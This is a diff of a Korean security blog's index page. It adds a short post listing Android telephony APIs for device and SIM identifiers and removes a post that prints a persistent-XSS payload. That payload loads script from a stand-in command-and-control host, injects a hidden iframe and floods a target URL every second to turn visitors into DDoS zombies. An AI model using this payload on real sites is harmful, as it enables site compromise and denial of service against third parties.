@@ -9,8 +9,13 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="VLC 0.9.4 on the Microsoft Windows Vista SP1 (32-bit) integer vlc-0.9.4\include\vlc_demux.h
-">
+  <meta name="description" content="Android Telephony APIs 훑어야 할 API 들. getDeviceId()
+getSubscriberId()
+getLine1Number
+getSimCountryIso()
+getSimOperator()
+getSimSerialNumber
+getSimState &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +71,57 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/18/android-telephony-api/">Android Telephony API</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-18T14:00:58+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>2:00 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Android Telephony APIs</h4>
+
+<p>훑어야 할 API 들.</p>
+
+<ul>
+<li>getDeviceId()</li>
+<li>getSubscriberId()</li>
+<li>getLine1Number</li>
+<li>getSimCountryIso()</li>
+<li>getSimOperator()</li>
+<li>getSimSerialNumber</li>
+<li>getSimState()</li>
+<li>getVoiceMailNumber()</li>
+</ul>
+
+
+<h4>References</h4>
+
+<ul>
+<li><a href="http://en.wikipedia.org/wiki/List_of_CDMA_terminology">List of CDMA terminology</a></li>
+<li><a href="http://developer.android.com/reference/android/telephony/TelephonyManager.html">public class TelephonyManager</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -697,57 +753,6 @@ eip=722ee19b esp=0326eccc ebp=0326ede8 iopl=0
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/05/14/ddos-using-a-persistent-xss/">DDoS Using a Persistent XSS</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-05-14T11:48:16+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:48 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://thehackernews.com/2014/04/vulnerability-in-worlds-largest-site.html">Vulnerability in World Largest Video Site Turned Million of Visitors into DDoS Zombies</a></p>
-
-<pre><code>// JS injection in &lt;img&gt; tag enabled by Persistent XSS
-&lt;img src="/imagename.jpg" onload="$.getScript('http://c&amp;cdomain.com/inject-iframe.html')&gt;
-
-// inject-iframe.html
-// Malicious JS opens hidden &lt;iframe&gt;
-$("body").append("&lt;iframe id='ifr11323' style='display:none;' src='http://c&amp;cdomain.com/ddos.html'&gt;&lt;/iframe&gt;");
-
-// ddos.html
-// Ajax DDoS script
-&lt;html&gt;&lt;body&gt;
-&lt;h1&gt;iframe&lt;/h1&gt;
-&lt;script&gt;
-ddos('http://www.target1.com');
-function ddos(url) {
-    window.setInterval( function() { $.getScript(url); }, 1000);
-}
-&lt;/script&gt;
-&lt;/body&gt;&lt;/html&gt;
-</code></pre>
-
-<p>사람들의 방문이 많은 사이트에 자바스크립트를 업로드할 수 있다면, 방문자의 브라우저를 DDoS 좀비로 만들 수 있다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/15">&larr; Older</a>
@@ -765,6 +770,10 @@ function ddos(url) {
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/02/07/the-dependency-of-android-sdk/">The Dependency of Android SDK</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/02/03/qseecom/">Qseecom</a>
       </li>
     
@@ -778,10 +787,6 @@ function ddos(url) {
     
       <li class="post">
         <a href="/blog/2016/01/11/cve-2013-2094-perf-swevent-enabled-revisited/">CVE-2013-2094: Perf_swevent_enabled Revisited</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
       </li>
     
   </ul>
